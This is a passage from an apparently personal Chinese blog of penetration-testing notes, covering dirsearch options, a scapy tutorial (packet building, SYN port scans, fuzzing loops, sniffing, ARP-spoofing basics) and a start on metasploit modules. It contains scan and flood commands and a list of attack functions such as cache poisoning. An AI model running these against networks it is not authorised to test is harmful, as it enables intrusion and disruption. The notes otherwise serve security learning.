mode</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --full-url          <span class="hljs-title class_">Full</span> <span class="hljs-title class_">URLs</span> <span class="hljs-keyword">in</span> the output (enabled automatically <span class="hljs-keyword">in</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       quiet mode)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --no-color          <span class="hljs-title class_">No</span> colored output</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Request</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -m <span class="hljs-variable constant_">METHOD</span>, --http-method=<span class="hljs-variable constant_">METHOD</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> method (<span class="hljs-attr">default</span>: <span class="hljs-variable constant_">GET</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -d <span class="hljs-variable constant_">DATA</span>, --data=<span class="hljs-variable constant_">DATA</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> request data</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -H <span class="hljs-variable constant_">HEADERS</span>, --header=<span class="hljs-variable constant_">HEADERS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> request header, support multiple flags (<span class="hljs-title class_">Example</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       -H <span class="hljs-string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --header-list=<span class="hljs-variable constant_">FILE</span>  <span class="hljs-title class_">File</span> contains <span class="hljs-variable constant_">HTTP</span> request headers</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -F, --follow-redirects</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Follow</span> <span class="hljs-variable constant_">HTTP</span> redirects</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --random-agent      <span class="hljs-title class_">Choose</span> a random <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span> <span class="hljs-keyword">for</span> each request</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --auth-type=<span class="hljs-variable constant_">TYPE</span>    <span class="hljs-title class_">Authentication</span> type (basic, digest, bearer, ntlm)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --auth=<span class="hljs-variable constant_">CREDENTIAL</span>   <span class="hljs-title class_">Authentication</span> credential (<span class="hljs-attr">user</span>:password or bearer</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       token)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --user-agent=<span class="hljs-variable constant_">USERAGENT</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --cookie=<span class="hljs-variable constant_">COOKIE</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Connection</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --timeout=<span class="hljs-variable constant_">TIMEOUT</span>   <span class="hljs-title class_">Connection</span> timeout</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -s <span class="hljs-variable constant_">DELAY</span>, --delay=<span class="hljs-variable constant_">DELAY</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Delay</span> between requests</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --proxy=<span class="hljs-variable constant_">PROXY</span>       <span class="hljs-title class_">Proxy</span> <span class="hljs-variable constant_">URL</span>, support <span class="hljs-variable constant_">HTTP</span> and <span class="hljs-variable constant_">SOCKS</span> proxies (<span class="hljs-title class_">Example</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-attr">localhost</span>:<span class="hljs-number">8080</span>, <span class="hljs-attr">socks5</span>:<span class="hljs-comment">//localhost:8088)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --proxy-list=<span class="hljs-variable constant_">FILE</span>   <span class="hljs-title class_">File</span> contains proxy servers</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --replay-proxy=<span class="hljs-variable constant_">PROXY</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Proxy</span> to replay <span class="hljs-keyword">with</span> found paths</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --scheme=<span class="hljs-variable constant_">SCHEME</span>     <span class="hljs-title class_">Default</span> scheme (<span class="hljs-keyword">for</span> raw request or <span class="hljs-keyword">if</span> there is no</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       scheme <span class="hljs-keyword">in</span> the <span class="hljs-variable constant_">URL</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --max-rate=<span class="hljs-variable constant_">RATE</span>     <span class="hljs-title class_">Max</span> requests per second</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --retries=<span class="hljs-variable constant_">RETRIES</span>   <span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> retries <span class="hljs-keyword">for</span> failed requests</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -b, --request-by-hostname</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">By</span> <span class="hljs-keyword">default</span> dirsearch requests by <span class="hljs-variable constant_">IP</span> <span class="hljs-keyword">for</span> speed. <span class="hljs-title class_">This</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       will force dirsearch to request by hostname</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --ip=<span class="hljs-variable constant_">IP</span>             <span class="hljs-title class_">Server</span> <span class="hljs-variable constant_">IP</span> address</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exit-on-error     <span class="hljs-title class_">Exit</span> whenever an error occurs</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Reports</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -o <span class="hljs-variable constant_">FILE</span>, --output=<span class="hljs-variable constant_">FILE</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Output</span> file</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --format=<span class="hljs-variable constant_">FORMAT</span>     <span class="hljs-title class_">Report</span> format (<span class="hljs-title class_">Available</span>: simple, plain, json, xml,md, csv, html)</span><br><br><br><br>## scapy---这东西真好玩<br><br>下面是官方源码地址:<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/secdev/scapy/blob/master/scapy/sessions.py</span></span><br><br><br><br>### 准备环境<br><br>![image-20220129180955360](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-1.png)<br><br><br><br>官方目前给出python对应的scapy版本  目前时间为:`2022-1-29`<br><br><br><br>首先下载安装<br><br>`pip install scapy`，然后在命令行中输入scapy即可运行交互的scapy<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">如果显示没有找到包则证明环境变量不对,我以win10为例子来说明一下</span><br><br>![image-20220129175922805](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-2.png)<br><br>必须包含你python的Scripts在环境变量中<br><br>kali也是直接安装(kali是ubuntu那一支的)`pip install scapy`,然后还需要:<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">apt-get install tcpdump</span><br><br><br><br>然后我们还有几个可能用到的依赖<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install matplotlib <span class="hljs-comment">//作图</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install pyx<span class="hljs-comment">//二维</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">但是如果要使用pyx需要安装 [texlive (<span class="hljs-title class_">Unix</span>)](<span class="hljs-attr">http</span>:<span class="hljs-comment">//www.tug.org/texlive/) 或 [MikTex (Windows)](https://miktex.org/) </span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">kali安装texlive方法<span class="hljs-string">`apt-get install texlive`</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install vpython<span class="hljs-comment">//三维</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install cryptography <span class="hljs-comment">//WEP解密</span></span><br><br><br><br><br><br>### 文档地址<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">中文文档</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//www.osgeo.cn/scapy/usage.html</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">英文文档</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//scapy.readthedocs.io/en/latest/usage.html</span></span><br><br>建议这俩组合起来看,否则你就会遇见下面这种翻译,这tm不是机翻我真不信<br><br>![img](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-3.png)<br><br><br><br>![111](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-4.png)<br><br><br><br>(不要问我为啥不直接看英文的)<br><br><br><br>### 开始使用!!<br><br>运行交互环境<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">scapy   </span><br><br><br><br>#### 自定义主题<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">conf.<span class="hljs-property">color_theme</span> = <span class="hljs-title class_">BrightTheme</span>()</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">下面是常用主题</span><br><span class="hljs-meta prompt_">&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><blockquote><p>DefaultTheme, BrightTheme, RastaTheme, ColorOnBlackTheme, BlackAndWhite, HTMLTheme, LatexTheme</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><br><br><span class="hljs-comment">#### 构建IP包</span><br><br>&gt;a=IP()<br><br>&gt;设置属性<br><br>&gt;a.dst=<span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>&gt;删除属性<br><br>&gt;del(a.dst)<br><br><br><br>合成包运算符(就算再python中也是这么用,我是没想到)<br><br>`IP()`<br>&lt;IP |&gt;<br>`P()/TCP()`<br>&lt;IP frag=<span class="hljs-number">0</span> proto=TCP |&lt;TCP |&gt;&gt;<br><br>`Ether()<span class="hljs-regexp">/IP()/</span>TCP()`<br><br>&lt;Ether  type=IPv4 |&lt;IP  frag=<span class="hljs-number">0</span> proto=tcp |&lt;TCP  |&gt;&gt;&gt;<br><br>`IP()<span class="hljs-regexp">/TCP()/</span><span class="hljs-string">&quot;GET / HTTP 1.1 \n\n&quot;</span>`<br><br>&lt;IP  frag=<span class="hljs-number">0</span> proto=tcp |&lt;TCP  |&lt;Raw  load=<span class="hljs-string">&#x27;GET / HTTP 1.1 \n\n&#x27;</span> |&gt;&gt;&gt;<br><br><br><br><span class="hljs-comment">#### 构造包和分解包</span><br><br>`raw(IP())`<br><br><span class="hljs-string">b&#x27;E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01&#x27;</span><br><br>`IP(_)`<br><br>&lt;IP  version=<span class="hljs-number">4</span> ihl=<span class="hljs-number">5</span> tos=<span class="hljs-number">0</span>x0 len=<span class="hljs-number">20</span> id=<span class="hljs-number">1</span> flags= frag=<span class="hljs-number">0</span> ttl=<span class="hljs-number">64</span> proto=hopopt chksum=<span class="hljs-number">0</span>x7ce7 src=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> dst=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> |&gt;<br><br>![image-<span class="hljs-number">20220129185254036</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">5</span>.png)<br><br>![image-<span class="hljs-number">20220129185355181</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">6</span>.png)<br><br>上面的e是使用函数对其进行补充后的包如果嫌他太臃肿可以使用`hide_defaults()来进行隐藏`<br><br>![image-<span class="hljs-number">20220129185707137</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">7</span>.png)<br><br><br><br><span class="hljs-comment">#### 从PCAP中读取</span><br><br>```python<br>a=rdpcap(<span class="hljs-string">&quot;/spare/captures/isakmp.cap&quot;</span>)<br></code></pre></td></tr></table></figure></blockquote><h4 id="将数据存为PDF或者PS"><a href="#将数据存为PDF或者PS" class="headerlink" title="将数据存为PDF或者PS"></a>将数据存为PDF或者PS</h4><table><thead><tr><th>Command</th><th>Effect</th></tr></thead><tbody><tr><td>raw(pkt)</td><td>源数据</td></tr><tr><td>hexdump(pkt)</td><td>&#x3D;&#x3D;16进制源数据&#x3D;&#x3D;</td></tr><tr><td>ls(pkt)</td><td>&#x3D;&#x3D;包列表,详细列出所有的包,的全名和属性&#x3D;&#x3D;</td></tr><tr><td>pkt.summary()</td><td>&#x3D;&#x3D;一条概括&#x3D;&#x3D;</td></tr><tr><td>pkt.show()</td><td>&#x3D;&#x3D;树状展示数据&#x3D;&#x3D;</td></tr><tr><td>pkt.show2()</td><td>没看出来和上面的有啥区别</td></tr><tr><td>pkt.sprintf()</td><td>没试出来有啥用</td></tr><tr><td>pkt.decode_payload_as()</td><td>changes the way the payload is decoded</td></tr><tr><td>pkt.psdump()</td><td>用解释的解剖绘制PostScript图表</td></tr><tr><td>pkt.pdfdump()</td><td>用解释的解剖绘制PDF</td></tr><tr><td>pkt.command()</td><td>返回可生成数据包的scapy命令</td></tr></tbody></table><h4 id="https-scapy-readthedocs-io-en-latest-usage-html-generating-sets-of-packets"><a href="#https-scapy-readthedocs-io-en-latest-usage-html-generating-sets-of-packets" class="headerlink" title="https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets"></a><a href="https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets">https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets</a></h4><p>这一部分没看懂,好像是你生成了一个数据包的集合然后你要怎么从一个来获取全部??</p><h4 id="发送数据包"><a href="#发送数据包" class="headerlink" title="发送数据包"></a>发送数据包</h4><p>主要有两个函数</p><p>send()用于发送第三层的数据包,无响应接收</p><p>sendp()用于发送第二层的数据包,无响应接收</p><p>sr1()用于发送三层的数据包,有响应接收</p><p>srp()用于二层的数据包,有响应接收</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-8.png" alt="image-20220130110015724"></p><blockquote><p>可以设置两个数据包之间的等待间隔使用inter参数(秒为单位)</p><p>如果某些包超时了,或者丢失了可以重传,使用retry参数来设置,如果retry&#x3D;3则尝试重新发送三次未响应的数据包,如果retry&#x3D;-3则重新发送未响应的数据包,并直到连续三次为止</p><p>timeout用来指定最后一个数据包的等待时间</p><p>下面是例子:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sr</span>(IP(dst=<span class="hljs-string">&quot;172.20.29.5/30&quot;</span>)/TCP(dport=[<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>]),inter=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,retry=-<span class="hljs-number">2</span>,timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure></blockquote><h4 id="默认值修改函数"><a href="#默认值修改函数" class="headerlink" title="默认值修改函数"></a>默认值修改函数</h4><p>fuzz()</p><p>修改后的数值是随机的,操作如下</p><blockquote><p>send(IP(dst&#x3D;”target”)&#x2F;fuzz(UDP()&#x2F;NTP(version&#x3D;4)),loop&#x3D;1)</p></blockquote><h4 id="注入字节"><a href="#注入字节" class="headerlink" title="注入字节"></a>注入字节</h4><p>在数据包中,所有的字段都有特定的类型,如果你想要注入不同的类型可以使用RawVal</p><blockquote><p>pkt &#x3D; IP(len&#x3D;RawVal(b”NotAnInteger”), src&#x3D;”127.0.0.1”)</p></blockquote><h4 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h4><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-9.png" alt="image-20220130111816301"></p><p>向百度发出请求,并且接收响应后退出,可以看出flags&#x3D;SA表示该端口为开放端口</p><p>检测多个端口</p><blockquote><p>sr(IP(dst&#x3D;”192.168.1.1”)&#x2F;TCP(sport&#x3D;666,dport&#x3D;(440,443),flags&#x3D;”S”))</p><p>从440到443端口</p></blockquote><blockquote><p>sr(IP(dst&#x3D;”192.168.1.1”)&#x2F;TCP(sport&#x3D;RandShort(),dport&#x3D;[440,441,442,443],flags&#x3D;”S”))</p><p>这样可以写成一个数组然后进行探测</p></blockquote><p>如果没有设置变量可以是使用_来获取探测结果</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span>, unans = _<br>&gt;&gt;&gt; <span class="hljs-built_in">ans</span>.summary()<br></code></pre></td></tr></table></figure><blockquote><p>ans.summary( lambda s,r: r.sprintf(“%TCP.sport% \t %TCP.flags%”) )</p></blockquote><p>还可以和上面这种进行格式化输出</p><p>&#x3D;&#x3D;make_table部分没看懂&#x3D;&#x3D;</p><p>过滤flags只为SA</p><p>nsummary和summary的区别</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-10.png" alt="image-20220203190633834"></p><blockquote><p>ans.nsummary(lfilter &#x3D; lambda s,r: r.sprintf(“%TCP.flags%”) &#x3D;&#x3D; “SA”)</p></blockquote><p>对端口进行专门分析,并得出哪些是开放的</p><blockquote><p>ans.summary(lfilter &#x3D; lambda s,r: r.sprintf(“%TCP.flags%”) &#x3D;&#x3D; “SA”,prn&#x3D;lambda s,r: r.sprintf(“%TCP.sport% is open”))</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311941997.png" alt="image-20220130113405578"></p><p>懒得写了,也没法做测试,毕竟上个一测试我还没做完了</p><h4 id="lsc-可查看大部分的函数"><a href="#lsc-可查看大部分的函数" class="headerlink" title="lsc()可查看大部分的函数"></a>lsc()可查看大部分的函数</h4><blockquote><p>PID_count          : Identify IP id values classes in a list of packets<br>arpcachepoison      : Poison target’s cache with (your MAC,victim’s IP) couple<br>arping              : Send ARP who-has requests to determine which hosts are up<br>arpleak             : Exploit ARP leak flaws, like NetBSD-SA2017-002.<br>bind_layers         : Bind 2 layers on some specific fields’ values.<br>bridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and return<br>chexdump            : Build a per byte hexadecimal representation<br>computeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parameter<br>corrupt_bits        :<br>corrupt_bytes       :<br>defrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],<br>defragment          : defragment(plist) -&gt; plist defragmented as much as possible<br>dhcp_request        : Send a DHCP discover request and return the answer<br>dyndns_add          : Send a DNS add message to a nameserver for “name” to have a new “rdata”<br>dyndns_del          : Send a DNS delete message to a nameserver for “name”<br>etherleak           : Exploit Etherleak flaw<br>explore             : Function used to discover the Scapy layers and protocols.<br>fletcher16_checkbytes: Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.<br>fletcher16_checksum : Calculates Fletcher-16 checksum of the given buffer.<br>fragleak            : –<br>fragleak2           : –<br>fragment            : Fragment a big IP datagram<br>fuzz                :<br>getmacbyip          : Return MAC address corresponding to a given IP address<br>getmacbyip6         : Returns the MAC address corresponding to an IPv6 address<br>hexdiff             : Show differences between 2 binary strings<br>hexdump             : Build a tcpdump like hexadecimal view<br>hexedit             : Run hexedit on a list of packets, then return the edited packets.<br>hexstr              : Build a fancy tcpdump like hex from bytes.<br>import_hexcap       : Imports a tcpdump like hexadecimal view<br>is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.<br>linehexdump         : Build an equivalent view of hexdump() on a single line<br>ls                  : List  available layers, or infos on a given layer class or name.<br>neighsol            : Sends and receive an ICMPv6 Neighbor Solicitation message<br>overlap_frag        : Build overlapping fragments to bypass NIPS<br>promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode<br>rdpcap              : Read a pcap or pcapng file and return a packet list<br>report_ports        : portscan a target and output a LaTeX table<br>restart             : Restarts scapy<br>rfc                 :<br>send                :<br>sendp               :<br>sendpfast           : Send packets at layer 2 using tcpreplay for performance<br>sniff               :<br>split_layers        : Split 2 layers previously bound.<br>sr                  :<br>sr1                 :<br>sr1flood            : Flood and receive packets at layer 3 and return only the first answer<br>srbt                : send and receive using a bluetooth socket<br>srbt1               : send and receive 1 packet using a bluetooth socket<br>srflood             : Flood and receive packets at layer 3<br>srloop              : Send a packet at layer 3 in loop and print the answer each time<br>srp                 :<br>srp1                :<br>srp1flood           : Flood and receive packets at layer 2 and return only the first answer<br>srpflood            : Flood and receive packets at layer 2<br>srploop             : Send a packet at layer 2 in loop and print the answer each time<br>tcpdump             : Run tcpdump or tshark on a list of packets.<br>tdecode             :<br>traceroute          : Instant TCP traceroute<br>traceroute6         : Instant TCP traceroute using IPv6<br>traceroute_map      : Util function to call traceroute on multiple targets, then<br>tshark              : Sniff packets and print them calling pkt.summary().<br>wireshark           :<br>wrpcap              : Write a list of packets to a pcap file</p></blockquote><h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>套接字简单的理解是网络中两个应用之间的通信格式是ip：端口</p><p>默认情况使用本地套接字，如果要使用手动的数据包捕获库函数就要安装下面的东西：</p><ul><li>在UNIX&#x2F;OSX上：确保安装了libpcap。</li><li>在Windows上：安装npcap&#x2F;winpcap。（默认）</li></ul><p>然后</p><p>conf.use_pcap&#x3D;true</p><p>这时会自动使用</p><p>conf.L2socket和conf.L3socket</p><p>如果想要使用自定义的可以如下设置</p><blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;conf.<span class="hljs-attribute">L3socket</span>=L3pcapSocket  # Receive/send L3 packets through libpcap<br>&gt;conf.<span class="hljs-attribute">L2listen</span>=L2ListenTcpdump  # Receive L2 packets through TCPDump<br></code></pre></td></tr></table></figure></blockquote><h4 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h4><p>监听指定的包如下：</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-12.png" alt="image-20220203190331356"></p><p>然后可以使用</p><blockquote><p>a&#x3D;_</p><p>a[1]</p><p>a.nsummary()</p><p>来查看详细数据</p></blockquote><p>sniff函数解析如下:</p><ul><li><p>filter:使用过滤规则</p><ul><li><blockquote><p>sniff(filter&#x3D;”icmp and host 66.35.250.151”)</p><p>只保留icmp包和地址是66.35.250.151的数据包</p></blockquote></li></ul></li><li><p>session:监听包的类型</p><ul><li>IPSession:获取所有的IP包</li><li>TCPSession:获取所有的TCP包</li><li>TLSSession:匹配TLS会话&#x2F;&#x2F;这个好像不存在了</li></ul></li><li><p>iface:指定监听网卡号</p><ul><li><blockquote><p>sniff(iface&#x3D;”eth1”)</p><p>只保留eth1网卡的数据包</p></blockquote></li></ul></li><li><p>prn:结果显示方式</p><ul><li><blockquote><p>prn&#x3D;lambda x: x.show()</p><p>使用lambda来对数据用show来显示</p><p>sniff(iface&#x3D;[“eth1”,”eth2”], prn&#x3D;lambda x: x.sniffed_on+”: “+x.summary())</p><p>x.sniffed_on代表根据,如下的eth0</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-13.png" alt="image-20220203191845601"></p></blockquote></li></ul></li></ul><p>操作系统识别:可以使用ping的TTL来识别,不过可能会被伪装,&lt;64的操作系统是Linux或者unix反之则是Windows</p><p>异步嗅探:</p><p>AsyncSniffer使用这个来代替sniff就可以了参数和sniff一样</p><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>ARP：地址解析协议用来通知网络我是谁</p><p>原理是让受害机认为我是网关，让网关认为我是受害机</p><p>关于scapy的ARP包</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-14.png" alt="image-20220307165322717"></p><blockquote><p>op 为1代表请求,为2代表响应</p><p>hwsrc 发送方的MAC地址</p><p>psrc    发送方的ip</p><p>hwdst 目标的MAC</p><p>pdst    目标的IP</p></blockquote><h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>远程桌面连接软件</p><p><a href="https://blog.csdn.net/cunjiu9486/article/details/109073104">https://blog.csdn.net/cunjiu9486/article/details/109073104</a></p><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><h3 id="常用的功能模块"><a href="#常用的功能模块" class="headerlink" title="常用的功能模块"></a><strong>常用的功能模块</strong></h3><p>模块在kali的位置</p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;scripts&#x2F;meterpreter</p></blockquote><table><thead><tr><th>模块名称</th><th>模块作用</th></tr></thead><tbody><tr><td>Auxiliary</td><td>负责执行信息收集，扫描，嗅探，指纹识别，口令猜测和Dos攻击等功能的辅助模块</td></tr><tr><td>Exploits</td><td>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动，被动）</td></tr><tr><td>Payloads</td><td>成功exploit之后，真正在目标系统执行的代码和命令。</td></tr><tr><td>Post</td><td>后期渗透模块，在取得目标系统远程控制权后吗，进行一系列的后渗透攻击动作，如获取敏感信息，跳板攻击等操作。</td></tr><tr><td>Encoders</td><td>对payload进行加密，躲避antiviru检查的模块。</td></tr><tr><td>Nops</td><td>提高payload稳定性及维持大小，在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化，返回地址计算偏差等原因造成的shellcode执行失败，提高渗透攻击的可靠性。</td></tr></tbody></table><p>升级msf</p><blockquote><p>apt update</p></blockquote><p>MSFDB</p><blockquote><p>msfdb init       # start and initialize the database  postgresql<br>msfdb reinit    # delete and reinitialize the database<br>msfdb delete  # delete database and stop using it<br>msfdb start     # start the database<br>msfdb stop     # stop the database<br>msfdb status   # check service status<br>msfdb run       # start the database and run msfconsole</p></blockquote><table><thead><tr><th>help或者？</th><th>显示msfconsole可以使用的命令。</th></tr></thead><tbody><tr><td>connect</td><td>可以理解为MSF中的nc命令，可以使用connect 